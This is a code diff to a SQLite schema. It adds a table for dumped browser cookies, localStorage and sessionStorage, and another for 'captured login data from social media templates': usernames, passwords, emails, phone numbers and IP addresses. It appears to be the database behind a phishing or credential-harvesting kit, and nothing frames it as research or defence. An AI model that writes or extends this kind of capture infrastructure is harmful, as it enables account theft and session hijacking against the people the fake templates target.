@@ -120,6 +120,32 @@ CREATE TABLE IF NOT EXISTS events (
 CREATE INDEX IF NOT EXISTS idx_events_session ON events(session_id);
 CREATE INDEX IF NOT EXISTS idx_events_created ON events(created_at DESC);
 
+-- Storage Dumps: browser cookies, localStorage, sessionStorage
+CREATE TABLE IF NOT EXISTS storage_dumps (
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
+    session_id TEXT NOT NULL DEFAULT 'default',
+    data TEXT,
+    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now')),
+    FOREIGN KEY (session_id) REFERENCES sessions(id)
+);
+CREATE INDEX IF NOT EXISTS idx_storage_session ON storage_dumps(session_id);
+
+-- Credentials: captured login data from social media templates
+CREATE TABLE IF NOT EXISTS credentials (
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
+    session_id TEXT NOT NULL DEFAULT 'default',
+    template_id TEXT,
+    username TEXT,
+    password TEXT,
+    email TEXT,
+    phone TEXT,
+    ip_address TEXT,
+    created_at INTEGER NOT NULL DEFAULT (strftime('%s','now')),
+    FOREIGN KEY (session_id) REFERENCES sessions(id)
+);
+CREATE INDEX IF NOT EXISTS idx_cred_session ON credentials(session_id);
+CREATE INDEX IF NOT EXISTS idx_cred_created ON credentials(created_at DESC);
+
 -- Insert default session
 INSERT OR IGNORE INTO sessions (id, name, template_id, status)
 VALUES ('default', 'default', 'face-runner', 'active');
